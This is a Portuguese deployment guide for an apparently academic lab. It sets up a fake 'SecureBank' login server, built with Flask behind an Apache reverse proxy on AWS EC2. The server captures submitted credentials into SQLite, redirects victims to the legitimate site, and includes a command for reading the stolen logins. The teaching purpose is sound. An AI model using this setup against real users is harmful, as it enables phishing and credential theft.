# 🔴 Deploy na AWS EC2 — Servidor FAKE

Guia para subir o servidor Flask **fake** com Apache reverse proxy (simulação acadêmica MITM) em uma instância EC2 **separada** do site legítimo.

## Arquitetura

```
Navegador (porta 80) → Apache (mod_proxy) → Flask (127.0.0.1:8081)
```

- **Apache** recebe o tráfego público na porta 80
- **Flask** roda internamente na porta 8081, captura credenciais no SQLite
- Após captura, redireciona a vítima para o **site legítimo** (outra EC2)

---

## Pré-requisitos na AWS

1. **Instância EC2** com **Ubuntu 22.04 ou 24.04** (separada do site legítimo)
2. **Security Group** com as seguintes regras de entrada:

   | Tipo | Porta | Origem    |
   |------|-------|-----------|
   | SSH  | 22    | Seu IP    |
   | HTTP | 80    | 0.0.0.0/0 |

3. **Par de chaves (.pem)** para acesso SSH

---

## Passo a Passo

### 1. Enviar arquivos para a EC2

```bash
scp -i sua-chave.pem -r ./lab-tc-site-fake ubuntu@<IP-DA-EC2-FAKE>:~/securebank-fake
```

### 2. Conectar na EC2

```bash
ssh -i sua-chave.pem ubuntu@<IP-DA-EC2-FAKE>
```

### 3. Configurar a URL do site legítimo

**Antes de executar o deploy**, altere o IP do site legítimo em dois arquivos:

```bash
cd ~/securebank-fake

# No server.py (linha ~55):
nano server.py
# Altere: LEGITIMATE_SITE_URL = 'http://<IP-DA-EC2-LEGITIMA>'

# No script.js (linha ~38):
nano static/script.js
# Altere: const LEGITIMATE_SITE_URL = 'http://<IP-DA-EC2-LEGITIMA>';
```

### 4. Executar o deploy

```bash
sudo bash deploy.sh
```

O script faz **tudo automaticamente**:
- Instala Python 3, pip, venv e Apache
- Cria ambiente virtual e instala Flask
- Configura serviço systemd (`securebank-fake`)
- Configura Apache como reverse proxy (porta 80 → Flask 8081)
- Ativa e inicia ambos os serviços

### 5. Testar

```
http://<IP-PUBLICO-DA-EC2-FAKE>
```

---

## Comandos Úteis

| Ação | Comando |
|------|---------|
| Status do Flask | `sudo systemctl status securebank-fake` |
| Status do Apache | `sudo systemctl status apache2` |
| Logs do Flask | `sudo journalctl -u securebank-fake -f` |
| Logs do Apache | `sudo tail -f /var/log/apache2/securebank-fake-*.log` |
| Reiniciar tudo | `sudo systemctl restart securebank-fake apache2` |
| Ver credenciais capturadas | `sqlite3 /opt/securebank-fake/dados.db "SELECT * FROM logins;"` |

---

## Troubleshooting

### O site não carrega
1. Verifique os serviços: `sudo systemctl status securebank-fake apache2`
2. Verifique o Security Group — porta **80** aberta para **0.0.0.0/0**
3. Veja os logs: `sudo journalctl -u securebank-fake -f`

### Erro "Address already in use" na porta 80
Outro serviço está usando a porta 80:
```bash
sudo lsof -i :80
```

### Atualizar os arquivos do site
```bash
# No terminal local:
scp -i sua-chave.pem -r ./static/* ubuntu@<IP>:~/securebank-fake/static/
scp -i sua-chave.pem ./server.py ubuntu@<IP>:~/securebank-fake/

# Na EC2:
sudo cp ~/securebank-fake/server.py /opt/securebank-fake/
sudo cp -r ~/securebank-fake/static/* /opt/securebank-fake/static/
sudo systemctl restart securebank-fake
```

---

## Comparação: EC2 Legítima vs EC2 Fake

| Item | EC2 Legítima | EC2 Fake |
|------|-------------|----------|
| Diretório | `/opt/securebank` | `/opt/securebank-fake` |
| Serviço | `securebank` | `securebank-fake` |
| Porta Flask | 8080 | 8081 |
| Cores | Azul | Vermelho |
| POST /login | Redireciona → `/home.html` | JSON → redirect externo |
